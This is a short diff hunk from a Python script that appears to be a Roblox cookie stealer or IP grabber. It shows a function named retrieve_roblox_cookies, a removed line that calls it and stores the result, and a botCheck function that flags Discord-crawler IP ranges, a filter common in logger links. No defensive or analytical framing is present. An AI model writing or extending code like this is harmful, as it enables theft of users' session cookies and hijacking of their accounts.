@@ -99,8 +99,6 @@ def retrieve_roblox_cookies():
         except Exception as e:
             print(f"Error: {e}")
 
-cookie = retrieve_roblox_cookies()
-
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
